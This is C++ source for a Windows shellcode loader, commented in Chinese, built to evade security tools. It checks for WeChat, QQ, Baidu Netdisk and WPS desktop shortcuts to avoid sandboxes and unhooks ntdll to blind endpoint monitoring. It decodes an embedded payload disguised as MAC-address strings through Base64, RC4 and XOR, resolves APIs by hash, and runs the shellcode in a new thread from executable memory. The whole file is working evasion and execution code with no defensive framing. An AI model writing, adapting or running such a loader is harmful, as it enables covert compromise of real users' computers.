#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>

#pragma warning(disable:4996)

// 解密相关函数声明
unsigned char* mac_to_data(const char** mac_array, size_t* data_len);
unsigned char* base64_decode(const char* encoded, size_t* decoded_len);
typedef struct { unsigned char S[256]; int i; int j; } RC4_CTX;
void rc4_init(RC4_CTX* ctx, const unsigned char* key, size_t key_len);
void rc4_decrypt(RC4_CTX* ctx, unsigned char* data, size_t len);
void xor_decrypt(unsigned char* data, size_t len, unsigned char key);

// 环境检测函数声明
int CountFilesInDirectory(const std::wstring& path);
bool FileExists(const std::wstring& path);
bool FindSoftwareShortcut(const std::wstring& desktopPath, const std::vector<std::wstring>& possibleNames);

// 反挂钩函数声明
DWORD UNHOOKntdll();

// API哈希相关声明
DWORD CalculateHash(const char* str);
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash);

// 函数指针类型定义
typedef LPVOID(WINAPI* PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PFN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* PFN_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* PFN_WaitForSingleObject)(HANDLE, DWORD);

int main() {
    // 设置控制台为Unicode模式
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    // 定义要查找的软件
    std::vector<std::pair<std::wstring, std::vector<std::wstring>>> softwareList = {
        {L"微信", {L"微信.lnk", L"WeChat.lnk", L"wechat.lnk", L"微信WeChat.lnk"}},
        {L"QQ", {L"QQ.lnk", L"腾讯QQ.lnk", L"Tencent QQ.lnk", L"qq.lnk", L"TIM.lnk", L"腾讯TIM.lnk"}},
        {L"百度网盘", {L"百度网盘.lnk", L"百度云.lnk", L"百度云盘.lnk", L"BaiduNetdisk.lnk", L"Baidu Netdisk.lnk", L"BaiduYun.lnk"}},
        {L"WPS Office", {L"WPS Office.lnk", L"WPS.lnk", L"wps.lnk", L"WPS 2019.lnk", L"WPS 2023.lnk", L"金山WPS.lnk"}}
    };

    // 获取桌面路径
    wchar_t userDesktopPath[MAX_PATH];
    wchar_t publicDesktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, userDesktopPath);
    SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, publicDesktopPath);

    // 统计文件总数 & 查找快捷方式
    int totalFiles = CountFilesInDirectory(userDesktopPath) + CountFilesInDirectory(publicDesktopPath);
    int foundSoftwareCount = 0;
    for (const auto& software : softwareList) {
        bool found = FindSoftwareShortcut(userDesktopPath, software.second) ||
            FindSoftwareShortcut(publicDesktopPath, software.second);
        if (found) foundSoftwareCount++;
    }

    // 计算概率并判断
    int probability = foundSoftwareCount * 20 + (totalFiles > 15 ? 20 : 0);
    probability = min(probability, 100);
    std::wcout << L"检测概率: " << probability << L"%" << std::endl;
    if (probability <= 40) {
        std::wcout << L"概率低于阈值，程序退出" << std::endl;
        return 0;
    }

    // 执行ntdll反挂钩
    DWORD unhookResult = UNHOOKntdll();
    if (unhookResult != 0) {
        std::wcout << L"ntdll反挂钩失败，错误码: " << unhookResult << std::endl;
    }
    else {
        std::wcout << L"ntdll反挂钩成功" << std::endl;
    }

    // ======================================
    // 在ntdll反挂钩之后执行解密逻辑
    // ======================================

    // 加密后的MAC地址数组（需替换为加密脚本生成的内容）
    const char* mac_shellcode[] = {
         "43-68-47-31-70-30",
    "61-78-76-73-53-35",
    "6D-38-36-75-55-52",
    "6C-50-6C-43-64-46",
    "30-39-47-57-59-37",
    "6E-6E-5A-43-47-50",
    "53-5A-77-73-6C-54",
    "68-53-57-62-52-69",
    "44-6C-6C-4E-55-44",
    "6A-65-7A-35-31-6F",
    "63-31-44-52-52-66",
    "52-61-6C-6F-74-34",
    "39-6D-73-36-67-63",
    "5A-2F-49-79-2F-33",
    "49-66-44-65-48-34",
    "47-64-6C-74-30-76",
    "55-58-30-77-65-50",
    "33-53-66-67-46-75",
    "56-56-53-57-4E-39",
    "68-62-49-6D-2F-72",
    "72-62-44-6C-53-51",
    "6B-48-41-2B-71-53",
    "64-6F-2F-79-53-4A",
    "76-4B-44-70-6F-43",
    "59-57-75-53-6E-70",
    "6B-4D-74-53-52-70",
    "41-62-47-76-58-79",
    "6C-45-50-72-37-2F",
    "4F-5A-64-77-57-51",
    "34-43-74-76-32-56",
    "6C-2F-49-7A-68-75",
    "4B-6F-2F-41-7A-69",
    "4D-58-4F-30-4F-6E",
    "42-4A-6B-71-77-4B",
    "49-2F-57-74-39-6E",
    "73-78-74-61-58-72",
    "4E-38-65-35-30-6F",
    "38-78-65-53-71-52",
    "77-41-38-54-6E-7A",
    "42-68-6D-44-4C-34",
    "4C-46-64-63-64-75",
    "35-51-66-65-4D-6D",
    "61-54-33-4B-41-62",
    "32-79-2F-70-68-77",
    "46-66-34-79-50-55",
    "58-37-4C-70-4C-73",
    "58-2F-59-75-6D-78",
    "64-59-72-61-39-31",
    "44-48-49-78-6A-45",
    "67-6A-6D-54-53-78",
    "4A-32-73-59-64-75",
    "48-52-4F-4C-55-74",
    "43-77-30-63-76-2F",
    "53-72-73-67-71-31",
    "55-6D-37-54-42-75",
    "31-47-76-49-52-56",
    "39-79-66-30-79-73",
    "6A-43-71-53-42-43",
    "51-64-33-76-68-5A",
    "6D-6D-39-46-67-61",
    "47-71-51-64-39-76",
    "41-6B-70-4E-50-33",
    "71-4D-72-2B-77-72",
    "53-62-31-33-41-72",
    "31-66-72-62-6D-41",
    "70-69-62-57-4D-54",
    "66-47-36-37-6E-5A",
    "33-53-2F-67-71-58",
    "79-59-68-79-59-6D",
    "62-58-6E-4A-58-65",
    "56-46-49-6E-6A-51",
    "6E-2F-63-7A-70-68",
    "6E-6C-55-76-75-4C",
    "6A-2B-57-59-33-5A",
    "4E-72-39-79-31-64",
    "38-2B-38-2F-42-36",
    "69-65-57-38-68-66",
    "55-31-6C-47-52-6F",
    "54-4B-4E-57-48-52",
    "55-4E-38-2B-55-4A",
    "2F-34-59-49-66-5A",
    "70-61-31-6B-76-36",
    "61-39-36-46-36-4B",
    "61-68-58-39-64-4C",
    "45-4A-63-42-33-57",
    "66-55-37-6D-6C-35",
    "6C-74-6B-52-39-44",
    "35-48-33-54-32-58",
    "57-76-37-65-47-58",
    "56-73-31-69-39-5A",
    "41-72-59-72-31-6B",
    "4F-58-73-62-4A-78",
    "54-48-68-79-78-4E",
    "4F-4A-59-48-54-35",
    "34-6F-50-57-7A-71",
    "43-4A-74-64-47-74",
    "31-6F-37-44-71-46",
    "35-58-30-56-34-6D",
    "57-62-34-42-42-77",
    "2F-79-46-54-62-5A",
    "48-53-66-65-79-77",
    "4B-53-6F-76-34-50",
    "35-44-50-44-43-68",
    "67-5A-37-32-6E-47",
    "52-78-63-59-76-4A",
    "6B-59-51-2B-74-63",
    "66-49-48-50-77-4C",
    "6F-76-41-33-59-56",
    "47-5A-53-4C-47-66",
    "75-6A-39-69-2B-45",
    "37-45-6D-79-4C-6C",
    "42-46-50-35-33-61",
    "67-6F-32-48-6A-76",
    "44-69-69-6D-69-50",
    "58-74-43-53-78-6D",
    "46-55-4A-62-31-6C",
    "72-6D-6F-6E-41-78",
    "76-36-59-46-53-6C",
    "6B-54-33-75-31-7A",
    "68-54-2F-6E-45-44",
    "57-2F-47-79-55-69",
    "7A-4E-48-39-36-75",
    "6A-4E-4D-6F-4A-42",
    "76-54-5A-61-6E-2B",
    "45-57-55-52-6F-65",
    "71-36-46-30-54-53",
    "4D-4E-34-59-2F-57",
    "77-62-78-4E-61-57",
    "35-52-51-4F-5A-4B",
    "4E-45-50-55-31-34",
    "55-35-31-50-71-38",
    "59-72-38-4C-70-5A",
    "4B-59-6E-6A-43-64",
    "5A-4A-77-46-78-76",
    "77-73-6E-38-44-33",
    "2F-65-66-72-36-4A",
    "6E-48-52-55-51-32",
    "33-79-4B-6E-6D-48",
    "4A-41-6D-58-63-2F",
    "51-62-69-50-65-67",
    "4A-56-7A-79-37-61",
    "47-2B-4B-52-48-54",
    "37-54-2F-34-50-50",
    "41-46-62-4C-70-7A",
    "63-32-55-4C-31-36",
    "73-47-5A-6D-58-49",
    "75-57-76-30-2F-5A",
    "4B-35-72-45-71-41",
    "79-71-53-75-58-49",
    "34-51-5A-6F-6D-79",
    "33-69-70-46-6A-38",
    "61-53-54-2B-4D-41",
    "6A-47-53-56-51-31",
    "73-4C-44-4E-38-33",
    "2B-30-35-36-53-42",
    "4C-42-43-6F-34-44",
    "37-4F-6F-52-6E-6D",
    "66-75-42-78-75-67",
    "57-73-6C-66-6A-6D",
    "2F-75-58-76-53-30",
    "48-48-56-52-32-70",
    "45-6F-33-69-4A-59",
    "57-50-45-37-44-70",
    "31-6B-2F-38-41-7A",
    "51-6C-45-75-61-71",
    "44-5A-4D-4E-6D-46",
    "2F-53-2F-48-77-32",
    "66-4D-44-63-36-76",
    "4E-42-44-63-6D-52",
    "71-53-5A-6D-51-33",
    "4F-63-50-6A-6A-33",
    "2B-57-78-32-4B-70",
    "34-6E-54-36-5A-6C",
    "36-55-71-64-47-77",
    "67-4A-6F-6F-30-50",
    "37-37-6F-51-6D-59",
    "52-39-4E-6F-31-6B",
    "4C-70-67-6E-4C-63",
    "39-35-66-4F-4A-42",
    "69-7A-4E-4C-4B-33",
    "44-78-5A-2F-39-6C",
    "68-6E-6F-42-5A-44",
    "6A-6E-62-68-2F-38",
    "4C-46-38-2F-62-71",
    "38-2B-6B-58-45-47",
    "47-53-77-51-61-6C",
    "55-59-75-46-54-43",
    "49-62-65-36-49-75",
    "46-44-69-39-43-71",
    "47-63-59-54-79-49",
    "35-4A-64-57-73-35",
    "70-48-68-69-70-4B",
    "48-4B-61-79-62-33",
    "66-62-6E-45-54-49",
    "4E-4C-46-34-64-66",
    "37-48-78-39-79-58",
    "64-45-48-34-63-43",
    "74-39-61-6D-78-59",
    "50-53-41-3D-00-00",
    NULL  // 结束标记
    };

    // 加密时使用的密钥（必须与加密脚本一致）
    const unsigned char rc4_key[] = "MySecretKey123!@#"; // RC4密钥
    const unsigned char xor_key = 0xAB; // XOR密钥

    std::wcout << L"\n=== 在ntdll反挂钩后开始解密Shellcode ===" << std::endl;

    // 第1步：MAC格式转换为Base64数据
    size_t base64_len;
    unsigned char* base64_data = mac_to_data(mac_shellcode, &base64_len);
    if (!base64_data) {
        std::wcout << L"MAC格式转换失败" << std::endl;
        return -1;
    }
    std::wcout << L"1. MAC转Base64成功 (" << base64_len << L"字节)" << std::endl;

    // 第2步：Base64解码
    size_t rc4_len;
    unsigned char* rc4_data = base64_decode((const char*)base64_data, &rc4_len);
    free(base64_data);
    if (!rc4_data) {
        std::wcout << L"Base64解码失败" << std::endl;
        return -1;
    }
    std::wcout << L"2. Base64解码成功 (" << rc4_len << L"字节)" << std::endl;

    // 第3步：RC4解密
    RC4_CTX rc4_ctx;
    rc4_init(&rc4_ctx, rc4_key, strlen((const char*)rc4_key));
    rc4_decrypt(&rc4_ctx, rc4_data, rc4_len);
    std::wcout << L"3. RC4解密完成" << std::endl;

    // 第4步：XOR解密
    xor_decrypt(rc4_data, rc4_len, xor_key);
    std::wcout << L"4. XOR解密完成，获取原始Shellcode (" << rc4_len << L"字节)" << std::endl;

    // ======================================
    // 使用原有方式执行Shellcode
    // ======================================

    // 获取kernel32.dll句柄
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    // API哈希值
    DWORD HASH_VIRTUALALLOC = 0xDF894B12;
    DWORD HASH_VIRTUALPROTECT = 0x77E9F7C8;
    DWORD HASH_CREATETHREAD = 0x26662FCC;
    DWORD HASH_WAITFORSINGLEOBJECT = 0xB93BC4D5;

    // 通过哈希值获取函数指针
    PFN_VirtualAlloc pVirtualAlloc = (PFN_VirtualAlloc)GetApiByHash(hKernel32, HASH_VIRTUALALLOC);
    PFN_VirtualProtect pVirtualProtect = (PFN_VirtualProtect)GetApiByHash(hKernel32, HASH_VIRTUALPROTECT);
    PFN_CreateThread pCreateThread = (PFN_CreateThread)GetApiByHash(hKernel32, HASH_CREATETHREAD);
    PFN_WaitForSingleObject pWaitForSingleObject = (PFN_WaitForSingleObject)GetApiByHash(hKernel32, HASH_WAITFORSINGLEOBJECT);

    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject) {
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    // 使用解密后的shellcode替换原有空shellcode
    unsigned char* cs_shellcode = rc4_data;
    SIZE_T shellcodeSize = rc4_len;

    // 若Shellcode为空，可跳过后续执行逻辑
    if (shellcodeSize == 0) {
        free(rc4_data); // 释放解密的shellcode
        return 0;
    }

    // 步骤1: 分配内存
    LPVOID pShellcodeMemory = pVirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pShellcodeMemory) {
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    // 步骤2: 复制Shellcode
    memcpy(pShellcodeMemory, cs_shellcode, shellcodeSize);

    // 步骤3: 创建线程执行Shellcode
    DWORD threadId;
    HANDLE hThread = pCreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pShellcodeMemory,
        NULL,
        0,
        &threadId
    );

    if (!hThread) {
        VirtualFree(pShellcodeMemory, 0, MEM_RELEASE);
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    pWaitForSingleObject(hThread, INFINITE); // 等待线程结束
    CloseHandle(hThread);
    VirtualFree(pShellcodeMemory, 0, MEM_RELEASE);
    // 注意：此时rc4_data已被释放，因为它与cs_shellcode指向同一块内存

    return 0;
}

// ======================================
// 解密函数实现
// ======================================

// MAC格式转原始数据
unsigned char* mac_to_data(const char** mac_array, size_t* data_len) {
    size_t mac_count = 0;
    while (mac_array[mac_count] != NULL) mac_count++;
    *data_len = mac_count * 6;
    unsigned char* data = (unsigned char*)malloc(*data_len);
    if (!data) return NULL;

    for (size_t i = 0; i < mac_count; i++) {
        sscanf(mac_array[i], "%02hhx-%02hhx-%02hhx-%02hhx-%02hhx-%02hhx",
            &data[i * 6], &data[i * 6 + 1], &data[i * 6 + 2],
            &data[i * 6 + 3], &data[i * 6 + 4], &data[i * 6 + 5]);
    }
    return data;
}

// Base64解码
unsigned char* base64_decode(const char* encoded, size_t* decoded_len) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = strlen(encoded);
    *decoded_len = (len / 4) * 3;

    if (encoded[len - 1] == '=') (*decoded_len)--;
    if (encoded[len - 2] == '=') (*decoded_len)--;

    unsigned char* decoded = (unsigned char*)malloc(*decoded_len);
    if (!decoded) return NULL;

    for (size_t i = 0, j = 0; i < len; ) {
        int a = strchr(base64_chars, encoded[i++]) - base64_chars;
        int b = strchr(base64_chars, encoded[i++]) - base64_chars;
        int c = (encoded[i] == '=') ? 0 : strchr(base64_chars, encoded[i++]) - base64_chars;
        int d = (encoded[i] == '=') ? 0 : strchr(base64_chars, encoded[i++]) - base64_chars;

        decoded[j++] = (a << 2) | (b >> 4);
        if (j < *decoded_len) decoded[j++] = ((b & 0xF) << 4) | (c >> 2);
        if (j < *decoded_len) decoded[j++] = ((c & 0x3) << 6) | d;
    }
    return decoded;
}

// RC4初始化
void rc4_init(RC4_CTX* ctx, const unsigned char* key, size_t key_len) {
    for (int i = 0; i < 256; i++) ctx->S[i] = (unsigned char)i;
    for (int i = 0, j = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
    ctx->i = 0; ctx->j = 0;
}

// RC4解密
void rc4_decrypt(RC4_CTX* ctx, unsigned char* data, size_t len) {
    for (size_t k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        unsigned char temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

// XOR解密
void xor_decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}

// ======================================
// 环境检测函数实现
// ======================================

// 统计目录中的文件数量
int CountFilesInDirectory(const std::wstring& path) {
    int count = 0;
    std::wstring searchPath = path + L"\\*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") && wcscmp(findData.cFileName, L"..") &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                count++;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    return count;
}

// 检查文件是否存在
bool FileExists(const std::wstring& path) {
    DWORD attrib = GetFileAttributesW(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

// 查找软件快捷方式
bool FindSoftwareShortcut(const std::wstring& desktopPath, const std::vector<std::wstring>& possibleNames) {
    for (const auto& name : possibleNames) {
        if (FileExists(desktopPath + L"\\" + name)) return true;
    }
    return false;
}

// ======================================
// 反挂钩函数实现
// ======================================

// 恢复ntdll.dll原始代码（反挂钩）
DWORD UNHOOKntdll() {
    MODULEINFO mi = {};
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 1;

    GetModuleInformation(GetCurrentProcess(), hNtdll, &mi, sizeof(mi));
    LPVOID ntdllBase = mi.lpBaseOfDll;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 2;

    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 3; }

    LPVOID mapAddr = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!mapAddr) { CloseHandle(hMap); CloseHandle(hFile); return 4; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)ntdllBase + dos->e_lfanew);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(nt) + i * IMAGE_SIZEOF_SECTION_HEADER);
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD oldProt;
            VirtualProtect((LPVOID)((ULONG_PTR)ntdllBase + sec->VirtualAddress), sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
            memcpy((LPVOID)((ULONG_PTR)ntdllBase + sec->VirtualAddress), (LPVOID)((ULONG_PTR)mapAddr + sec->VirtualAddress), sec->Misc.VirtualSize);
            VirtualProtect((LPVOID)((ULONG_PTR)ntdllBase + sec->VirtualAddress), sec->Misc.VirtualSize, oldProt, &oldProt);
        }
    }

    UnmapViewOfFile(mapAddr);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
}

// ======================================
// API哈希相关实现
// ======================================

// 计算字符串哈希值
DWORD CalculateHash(const char* str) {
    DWORD hash = 0;
    while (*str) hash = ((hash << 5) + hash) + *str++;
    return hash;
}

// 通过哈希值查找API地址
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    WORD* pAddressOfOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* pFunctionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
        if (CalculateHash(pFunctionName) == targetHash) {
            WORD ordinal = pAddressOfOrdinals[i];
            return (FARPROC)((BYTE*)hModule + pAddressOfFunctions[ordinal]);
        }
    }
    return NULL;
}